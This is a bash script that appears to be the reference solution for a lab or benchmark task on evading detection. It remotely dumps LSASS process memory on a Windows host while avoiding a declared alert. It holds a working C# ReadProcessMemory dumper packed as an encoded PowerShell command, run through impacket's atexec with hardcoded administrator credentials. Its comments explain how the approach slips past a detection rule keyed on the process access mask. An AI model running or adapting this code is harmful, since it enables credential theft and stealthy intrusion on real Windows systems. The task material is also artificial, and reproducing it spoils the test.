#!/bin/bash
# Reference for evade-detection-t1003-001, run on the attack box: perform the
# T1003.001 dump (LSASS memory) while the declared alert stays out of the
# exported stream. The technique is a RAW READPROCESSMEMORY REGION DUMP (the
# nanodump family): open lsass once with 0x1410 (PROCESS_QUERY_INFORMATION |
# PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ), walk the committed
# readable regions with VirtualQueryEx, and ReadProcessMemory them to disk.
# dbghelp is deliberately avoided: MiniDumpWriteDump RE-OPENS the target with
# full access internally, measured in this fixture's battery as a second
# EventID 10 from the same process 25 ms after a 0x1410 caller open, with
# GrantedAccess 0x1FFFFF and a dbgcore.DLL CallTrace, so ANY dbghelp-based
# dump trips the declared alert regardless of the caller's own mask (the
# comsvcs lolbas is just the loudest case). HONEST against the narrowed
# sensor config: powershell.exe is NOT excluded, so the EventID 10 record
# (lsass, GrantedAccess 0x1410) is recorded, bridged, forwarded, and
# exported; the telemetry works end to end and a defender reading the stream
# sees the open. Only the DECLARED alert (the 0x1FFFFF full-access mask) does
# not match. No hiding spot is used and the sensor is never touched. Evade
# goals take no submissions: the goal scores by counting qualifying alerts
# over the trailing window (must be zero, over a complete flowing window).
set -euo pipefail

WIN=10.0.2.11
SPLUNK=10.0.2.10

deadline=$(( $(date +%s) + 600 ))
until nc -z -w3 "$WIN" 445 && nc -z -w3 "$SPLUNK" 9997; do
  [ "$(date +%s)" -lt "$deadline" ] || { echo "the surfaces never converged" >&2; exit 1; }
  sleep 10
done

# window separation: the previous checks' telemetry (the detection and
# quiet-discovery trios ran first on this shared stream; neither can match
# this goal's lsass filter, but the quiet verdict should still open on a
# window of its own) must age out of the goal's 180 s trailing scoring
# window before this check's quiet verdict is read
sleep 180

# the dump script travels -EncodedCommand (UTF-16LE base64) for transport:
# atexec's command line cannot carry a multiline script. No fragment shielding
# is needed: the decoded source ships through the collected 4104 channel by
# design (working telemetry), and nothing in it can match the goal's anchored
# severity + 0x1FFFFF content filter. The read is capped at 256 MiB for the
# chain budget; the size floor below proves a real lsass memory image landed.
payload=$(python3 - <<'PY'
import base64

script = r"""
$ErrorActionPreference = 'Stop'
$src = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
public struct MBI {
  public IntPtr Base; public IntPtr ABase; public uint AProt; public uint _a;
  public IntPtr Size; public uint State; public uint Prot; public uint Kind; public uint _b;
}
public static class R {
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
  [DllImport("kernel32.dll")]
  public static extern IntPtr VirtualQueryEx(IntPtr h, IntPtr addr, out MBI m, IntPtr len);
  [DllImport("kernel32.dll")]
  public static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, IntPtr n, out IntPtr got);
  [DllImport("kernel32.dll")]
  public static extern bool CloseHandle(IntPtr h);
  public static long Dump(int pid, string path) {
    IntPtr h = OpenProcess(0x1410, false, pid);
    if (h == IntPtr.Zero) return -1;
    long total = 0; ulong addr = 0; byte[] buf = new byte[1048576];
    using (FileStream f = File.Create(path)) {
      while (addr < 0x7FFFFFFEFFFFUL && total < 268435456L) {
        MBI m;
        if (VirtualQueryEx(h, (IntPtr)(long)addr, out m, (IntPtr)Marshal.SizeOf(typeof(MBI))) == IntPtr.Zero) break;
        ulong size = (ulong)(long)m.Size;
        if (size == 0) break;
        if (m.State == 0x1000 && (m.Prot & 0x100) == 0 && m.Prot != 0 && m.Prot != 0x01) {
          ulong off = 0;
          while (off < size) {
            int n = (int)Math.Min(size - off, (ulong)buf.Length);
            IntPtr got;
            if (ReadProcessMemory(h, (IntPtr)(long)(addr + off), buf, (IntPtr)n, out got) && (long)got > 0) {
              f.Write(buf, 0, (int)(long)got); total += (long)got;
            }
            off += (ulong)n;
          }
        }
        addr = (ulong)(long)m.Base + size;
      }
    }
    CloseHandle(h);
    return total;
  }
}
'@
Add-Type -TypeDefinition $src
$lsass = Get-Process lsass
$bytes = [R]::Dump($lsass.Id, 'C:\Windows\Temp\q.bin')
if ($bytes -lt 0) { Write-Output 'OPEN-FAILED'; exit 2 }
Write-Output ('DUMPED-BYTES ' + $bytes)
"""
print(base64.b64encode(script.encode("utf-16-le")).decode())
PY
)

echo "step: raw region dump of lsass (T1003.001, one 0x1410 open, no dbghelp)" >&2
dump_out=$(timeout 300 atexec.py 'Administrator:changeme123!@'"$WIN" \
  "powershell -NoProfile -EncodedCommand $payload" 2>&1 || true)
# execution evidence, not exit codes (impacket exits 0 on handled errors): the
# dump must PROVABLY land, with a size floor that only a real lsass memory
# image clears (an empty or error-path run cannot), or this check passes
# vacuously on a quiet window it never earned
dump_bytes=$(grep -oE 'DUMPED-BYTES [0-9]+' <<<"$dump_out" | grep -oE '[0-9]+' | head -1 || true)
if [ -z "$dump_bytes" ] || [ "$dump_bytes" -lt 5000000 ]; then
  echo "the dump never landed (bytes: ${dump_bytes:-none})" >&2
  tail -5 <<<"$dump_out" >&2
  exit 1
fi
echo "dump landed ($dump_bytes bytes)" >&2
# bounded cleanup (the detection reference's lesson: a hung step between the
# technique and the fetch ages events out of their own window; here it only
# protects the settle budget). The credential material never leaves the
# endpoint.
timeout 30 atexec.py 'Administrator:changeme123!@'"$WIN" \
  'cmd /c del /f /q C:\Windows\Temp\q.bin' >/dev/null 2>&1 || true

# the pipeline settle: the quiet verdict needs a complete, flowing window, so
# the check's own benign telemetry (process creates, the 0x1410 record) must
# finish shipping before scoring reads the stream
echo "step: telemetry settle" >&2
sleep 45
echo "T1003.001 done at 0x1410; the declared 0x1FFFFF alert must be absent" >&2
